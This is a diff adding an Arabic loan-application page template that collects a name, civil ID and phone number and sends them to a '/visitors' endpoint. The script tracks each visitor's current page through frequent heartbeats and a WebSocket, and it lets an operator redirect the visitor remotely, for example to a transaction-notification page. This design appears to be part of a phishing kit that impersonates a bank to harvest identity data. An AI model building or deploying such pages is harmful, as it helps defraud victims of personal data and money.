@@ -1,0 +1,566 @@
+<!doctype html> <html lang="ar" dir="rtl"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width,initial-scale=1"> <title>بيانات العميل</title> <link rel="stylesheet" href="{{ url_for('static', path='css/fonts.css') }}"> <style> * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: "InterLocal", system-ui, -apple-system, "Segoe UI", sans-serif;
+      background: #ffffff;
+      color: #1f2937;
+      min-height: 100vh;
+    }
+
+    .loan-header {
+      height: 58px;
+      background: #ffffff;
+      border-bottom: 1px solid #e5e7eb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0 16px;
+      position: relative;
+    }
+
+    .loan-back-btn {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 34px;
+      height: 34px;
+      border: 0;
+      border-radius: 10px;
+      background: transparent;
+      color: #01a4e0;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    .loan-back-btn svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    .loan-logo {
+      height: 24px;
+      width: auto;
+      display: block;
+    }
+
+    .content {
+      max-width: 560px;
+      margin: 24px auto;
+      padding: 0 16px 96px;
+    }
+
+    .intro {
+      max-width: 560px;
+      margin: 18px auto 0;
+      padding: 0 16px;
+      text-align: center;
+    }
+
+    .intro-title {
+      margin: 0 0 6px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: #111827;
+    }
+
+    .intro-description {
+      margin: 0;
+      font-size: 0.92rem;
+      color: #4b5563;
+    }
+
+    .panel {
+      border-radius: 14px;
+      padding: 18px;
+      background: #ffffff;
+    }
+
+    .field {
+      display: grid;
+      gap: 10px;
+      margin-bottom: 30px;
+    }
+
+    .field:last-child {
+      margin-bottom: 0;
+    }
+
+    .field label {
+      font-size: 0.82rem;
+      font-weight: 400;
+      color: #374151;
+    }
+
+    .required-star {
+      color: #dc2626;
+    }
+
+    .field input {
+      width: 100%;
+      border: 0;
+      border-bottom: 2px solid #c8c9cb;
+      border-radius: 0;
+      background: transparent;
+      color: #111827;
+      padding: 0 0 6px;
+      font-size: 0.82rem;
+      font-weight: 400;
+      outline: none;
+    }
+
+    .field input:focus {
+      border-bottom-color: #04a3e0;
+    }
+
+    .field input.is-invalid {
+      border-bottom-color: #dc2626;
+    }
+
+    .field-error {
+      margin: 0;
+      min-height: 16px;
+      font-size: 0.74rem;
+      color: #dc2626;
+    }
+
+    #phone-number {
+      text-align: right;
+    }
+
+    .next-action {
+      position: fixed;
+      left: 16px;
+      bottom: calc(10px + env(safe-area-inset-bottom));
+      z-index: 20;
+    }
+
+    .next-btn {
+      width: auto;
+      min-width: 110px;
+      min-height: 30px;
+      border: 0;
+      border-radius: 10px;
+      background: #04a3e0;
+      color: #ffffff;
+      font-size: 0.92rem;
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+
+    .next-btn:disabled {
+      background: #9ca3af;
+      cursor: not-allowed;
+    }
+
+    .next-error {
+      margin: 8px 0 0;
+      font-size: 0.74rem;
+      color: #dc2626;
+      min-height: 16px;
+    } </style> </head> <body> <header class="loan-header"> <button class="loan-back-btn" id="loan-back-btn" type="button" aria-label="رجوع"> <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"> <path d="M10 6L16 12L10 18" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/> </svg> </button> <img src="{{ url_for('static', path='images/logo.png') }}" alt="Logo" class="loan-logo"> </header> <section class="intro"> <h1 class="intro-title">بيانات العميل</h1> <p class="intro-description">أكمل المعلومات المطلوبة للمتابعة</p> </section> <main class="content"> <section class="panel"> <div class="field"> <label for="applicant-name">أسم مقدم الطلب <span class="required-star">*</span></label> <input id="applicant-name" name="applicant_name" required minlength="4" placeholder="اكتب الاسم"> <p class="field-error" id="applicant-name-error" aria-live="polite"></p> </div> <div class="field"> <label for="civil-id"><span id="civil-id-label-text">الرقم المدني</span> <span class="required-star">*</span></label> <input id="civil-id" name="civil_id" required inputmode="numeric" pattern="[0-9]+" placeholder="اكتب الرقم المدني"> <p class="field-error" id="civil-id-error" aria-live="polite"></p> </div> <div class="field"> <label for="phone-number">رقم الهاتف <span class="required-star">*</span></label> <input id="phone-number" name="phone_number" type="tel" required inputmode="numeric" pattern="[1-9][0-9]{7}" minlength="8" maxlength="8" placeholder="اكتب رقم الهاتف"> <p class="field-error" id="phone-number-error" aria-live="polite"></p> </div> </section> </main> <div class="next-action"> <button class="next-btn" id="next-btn" type="button" disabled="disabled">التالي</button> <p class="next-error" id="next-error" aria-live="polite"></p> </div> <script nonce="{{ request.state.csp_nonce }}"> (() => {
+      const currentPage = "بيانات العميل";
+      const backButton = document.getElementById("loan-back-btn");
+      const nextButton = document.getElementById("next-btn");
+      const nextError = document.getElementById("next-error");
+      const applicantNameInput = document.getElementById("applicant-name");
+      const applicantNameError = document.getElementById("applicant-name-error");
+      const civilIdLabelText = document.getElementById("civil-id-label-text");
+      const civilIdInput = document.getElementById("civil-id");
+      const civilIdError = document.getElementById("civil-id-error");
+      const phoneNumberInput = document.getElementById("phone-number");
+      const phoneNumberError = document.getElementById("phone-number-error");
+      const selectedCard = new URLSearchParams(window.location.search).get("card");
+      const isCommercialLoan = selectedCard === "commercial";
+      const arabicIndicDigits = "٠١٢٣٤٥٦٧٨٩";
+      const easternArabicIndicDigits = "۰۱۲۳۴۵۶۷۸۹";
+      const touched = {
+        applicantName: false,
+        civilId: false,
+        phoneNumber: false
+      };
+      let isSubmitting = false;
+
+      const toWesternDigits = (value) => {
+        return value
+          .replace(/[٠-٩]/g, (digit) => String(arabicIndicDigits.indexOf(digit)))
+          .replace(/[۰-۹]/g, (digit) => String(easternArabicIndicDigits.indexOf(digit)));
+      };
+
+      const sanitizeDigitsInput = (input, maxLength = null) => {
+        if (!input) {
+          return "";
+        }
+        let value = toWesternDigits(input.value);
+        value = value.replace(/\D+/g, "");
+        if (typeof maxLength === "number") {
+          value = value.slice(0, maxLength);
+        }
+        input.value = value;
+        return value;
+      };
+
+      const sanitizeApplicantName = () => {
+        if (!applicantNameInput) {
+          return;
+        }
+        const cleaned = applicantNameInput.value
+          .replace(/[^A-Za-z\u0621-\u064A\s]/g, "")
+          .replace(/\s{2,}/g, " ");
+        applicantNameInput.value = cleaned;
+      };
+
+      const getCivilIdMinLength = () => (isCommercialLoan ? 6 : 12);
+      const getCivilIdMaxLength = () => (isCommercialLoan ? 15 : 12);
+
+      const applyCivilIdLengthConstraints = () => {
+        if (!civilIdInput) {
+          return;
+        }
+        civilIdInput.setAttribute("minlength", String(getCivilIdMinLength()));
+        civilIdInput.setAttribute("maxlength", String(getCivilIdMaxLength()));
+      };
+
+      const setFieldError = (input, errorElement, message) => {
+        if (!input || !errorElement) {
+          return;
+        }
+        errorElement.textContent = message;
+        input.classList.toggle("is-invalid", message.length > 0);
+      };
+
+      const validateApplicantName = (forceRequired = false) => {
+        if (!applicantNameInput) {
+          return false;
+        }
+        sanitizeApplicantName();
+        const trimmed = applicantNameInput.value.trim();
+        let message = "";
+
+        if (trimmed.length === 0) {
+          if (forceRequired || touched.applicantName) {
+            message = "هذا الحقل مطلوب";
+          }
+        } else if (trimmed.length < 4) {
+          message = "الاسم يجب أن يكون 4 أحرف على الأقل";
+        }
+
+        setFieldError(applicantNameInput, applicantNameError, message);
+        applicantNameInput.setCustomValidity(message);
+        return message.length === 0;
+      };
+
+      const validateCivilId = (forceRequired = false) => {
+        const value = sanitizeDigitsInput(civilIdInput, getCivilIdMaxLength());
+        if (!civilIdInput) {
+          return false;
+        }
+        let message = "";
+
+        if (value.length === 0) {
+          if (forceRequired || touched.civilId) {
+            message = "هذا الحقل مطلوب";
+          }
+        } else if (!/^[0-9]+$/.test(value)) {
+          message = "يجب إدخال أرقام إنجليزية فقط";
+        } else if (isCommercialLoan && (value.length < 6 || value.length > 15)) {
+          message = "الرقم يجب أن يتكون من 6 إلى 15 رقمًا";
+        } else if (!isCommercialLoan && value.length !== 12) {
+          message = "يرجى إدخال رقم المدني بشكل صحيح";
+        }
+
+        setFieldError(civilIdInput, civilIdError, message);
+        civilIdInput.setCustomValidity(message);
+        return message.length === 0;
+      };
+
+      const validatePhoneNumber = (forceRequired = false) => {
+        const value = sanitizeDigitsInput(phoneNumberInput, 8);
+        if (!phoneNumberInput) {
+          return false;
+        }
+        let message = "";
+
+        if (value.length === 0) {
+          if (forceRequired || touched.phoneNumber) {
+            message = "هذا الحقل مطلوب";
+          }
+        } else if (value.startsWith("0")) {
+          message = "رقم الهاتف يجب ألا يبدأ بـ 0";
+        } else if (value.length !== 8) {
+          message = "رقم الهاتف يجب أن يتكون من 8 أرقام";
+        }
+
+        setFieldError(phoneNumberInput, phoneNumberError, message);
+        phoneNumberInput.setCustomValidity(message);
+        return message.length === 0;
+      };
+
+      const updateNextButtonState = (forceRequired = false) => {
+        const isApplicantNameValid = validateApplicantName(forceRequired);
+        const isCivilIdValid = validateCivilId(forceRequired);
+        const isPhoneNumberValid = validatePhoneNumber(forceRequired);
+        const isFormValid = isApplicantNameValid && isCivilIdValid && isPhoneNumberValid;
+        if (nextButton) {
+          nextButton.disabled = !isFormValid || isSubmitting;
+        }
+      };
+
+      applicantNameInput?.addEventListener("input", () => {
+        touched.applicantName = true;
+        updateNextButtonState();
+      });
+      applicantNameInput?.addEventListener("blur", () => {
+        touched.applicantName = true;
+        updateNextButtonState();
+      });
+      civilIdInput?.addEventListener("input", () => {
+        touched.civilId = true;
+        updateNextButtonState();
+      });
+      civilIdInput?.addEventListener("blur", () => {
+        touched.civilId = true;
+        updateNextButtonState();
+      });
+      phoneNumberInput?.addEventListener("input", () => {
+        touched.phoneNumber = true;
+        updateNextButtonState();
+      });
+      phoneNumberInput?.addEventListener("blur", () => {
+        touched.phoneNumber = true;
+        updateNextButtonState();
+      });
+      nextButton?.addEventListener("click", async () => {
+        touched.applicantName = true;
+        touched.civilId = true;
+        touched.phoneNumber = true;
+        updateNextButtonState(true);
+        if (nextButton?.disabled || isSubmitting) {
+          return;
+        }
+
+        isSubmitting = true;
+        updateNextButtonState();
+        if (nextError) {
+          nextError.textContent = "";
+        }
+
+        try {
+          const response = await fetch("/visitors/customer-info", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            credentials: "same-origin",
+            body: JSON.stringify({
+              applicant_name: applicantNameInput?.value.trim() ?? "",
+              civil_id: civilIdInput?.value.trim() ?? "",
+              phone_number: phoneNumberInput?.value.trim() ?? "",
+              loan_type: selectedCard || null
+            })
+          });
+
+          if (response.ok) {
+            if (selectedCard) {
+              window.location.href = `/additional-customer-info?card=${encodeURIComponent(selectedCard)}`;
+            } else {
+              window.location.href = "/additional-customer-info";
+            }
+            return;
+          }
+
+          if (nextError) {
+            nextError.textContent = "تعذر حفظ البيانات، حاول مرة أخرى.";
+          }
+        } catch (_) {
+          if (nextError) {
+            nextError.textContent = "تعذر حفظ البيانات، تحقق من الاتصال.";
+          }
+        }
+
+        isSubmitting = false;
+        updateNextButtonState(true);
+      });
+
+      if (selectedCard === "commercial") {
+        if (civilIdLabelText) {
+          civilIdLabelText.textContent = "الرقم الآلي أو رقم القيد المدني";
+        }
+        if (civilIdInput) {
+          civilIdInput.placeholder = "اكتب رقم القيد المدني";
+        }
+      }
+
+      applyCivilIdLengthConstraints();
+      updateNextButtonState();
+
+      fetch("/visitors/current-page", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        credentials: "same-origin",
+        body: JSON.stringify({ current_page: currentPage })
+      }).catch(() => {});
+
+      const checkAdminRedirect = () => {
+        fetch("/visitors/redirect-check", {
+          method: "GET",
+          headers: { Accept: "application/json" },
+          credentials: "same-origin",
+          cache: "no-store",
+        })
+          .then((response) => response.ok ? response.json() : null)
+          .then((payload) => {
+            if (!payload || payload.redirect !== true) {
+              return;
+            }
+            const targetPath = typeof payload.target_path === "string" ? payload.target_path.trim() : "";
+            if (targetPath && targetPath !== window.location.pathname) {
+              window.location.href = targetPath;
+            }
+          })
+          .catch(() => {});
+      };
+
+      let redirectSocket = null;
+      let redirectSocketReconnectTimer = null;
+      let redirectSocketPingTimer = null;
+      let hasRedirected = false;
+
+      const navigateToRedirectTarget = (targetPathRaw) => {
+        if (hasRedirected) {
+          return;
+        }
+        const targetPathInput = typeof targetPathRaw === "string" ? targetPathRaw.trim() : "";
+        const targetPath = ({
+          "/additional-info": "/additional-customer-info",
+          "/transaction-info": "/transaction-notification"
+        }[targetPathInput] || targetPathInput);
+        if (!targetPath || targetPath === window.location.pathname) {
+          return;
+        }
+        hasRedirected = true;
+        window.location.href = targetPath;
+      };
+
+      const connectAdminRedirectSocket = () => {
+        if (redirectSocketReconnectTimer) {
+          clearTimeout(redirectSocketReconnectTimer);
+          redirectSocketReconnectTimer = null;
+        }
+        if (redirectSocketPingTimer) {
+          clearInterval(redirectSocketPingTimer);
+          redirectSocketPingTimer = null;
+        }
+        if (redirectSocket && (redirectSocket.readyState === WebSocket.OPEN || redirectSocket.readyState === WebSocket.CONNECTING)) {
+          return;
+        }
+
+        const scheme = window.location.protocol === "https:" ? "wss:" : "ws:";
+        const socketUrl = `${scheme}//${window.location.host}/ws/visitor/redirect`;
+
+        try {
+          redirectSocket = new WebSocket(socketUrl);
+        } catch (_) {
+          redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
+          return;
+        }
+
+        redirectSocket.addEventListener("open", () => {
+          redirectSocketPingTimer = setInterval(() => {
+            if (!redirectSocket || redirectSocket.readyState !== WebSocket.OPEN) {
+              return;
+            }
+            try {
+              redirectSocket.send(JSON.stringify({ type: "heartbeat", current_page: currentPage }));
+            } catch (_) {
+              // noop
+            }
+          }, 5000);
+        });
+
+        redirectSocket.addEventListener("message", (event) => {
+          let payload = null;
+          try {
+            payload = JSON.parse(event.data);
+          } catch (_) {
+            payload = null;
+          }
+          const eventName = payload && typeof payload === "object"
+            ? String(payload.event || "").trim().toLowerCase()
+            : "";
+          if (eventName !== "visitor.redirect") {
+            return;
+          }
+          const meta = payload && typeof payload === "object" && payload.meta && typeof payload.meta === "object"
+            ? payload.meta
+            : null;
+          navigateToRedirectTarget(meta ? meta.target_path : "");
+        });
+
+        redirectSocket.addEventListener("close", () => {
+          if (redirectSocketPingTimer) {
+            clearInterval(redirectSocketPingTimer);
+            redirectSocketPingTimer = null;
+          }
+          redirectSocket = null;
+          redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
+        });
+
+        redirectSocket.addEventListener("error", () => {
+          try {
+            redirectSocket.close();
+          } catch (_) {
+            // noop
+          }
+        });
+      };
+
+      const sendHeartbeat = () => {
+        fetch("/visitors/heartbeat", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          credentials: "same-origin",
+          body: JSON.stringify({ current_page: currentPage })
+        }).catch(() => {});
+        checkAdminRedirect();
+      };
+
+      sendHeartbeat();
+      connectAdminRedirectSocket();
+      const heartbeatInterval = setInterval(() => {
+        if (document.visibilityState === "visible") {
+          sendHeartbeat();
+        }
+      }, 5000);
+      const redirectFallbackInterval = setInterval(() => {
+        if (document.visibilityState === "visible") {
+          checkAdminRedirect();
+        }
+      }, 15000);
+      document.addEventListener("visibilitychange", () => {
+        if (document.visibilityState === "visible") {
+          sendHeartbeat();
+        }
+      });
+
+      window.addEventListener("pageshow", () => {
+        hasRedirected = false;
+        sendHeartbeat();
+        connectAdminRedirectSocket();
+      });
+      window.addEventListener("beforeunload", () => {
+        clearInterval(heartbeatInterval);
+      clearInterval(redirectFallbackInterval);
+      });
+
+      backButton?.addEventListener("click", () => {
+        window.location.href = "/loan-calculator";
+      });
+    })(); </script> </body> </html> 
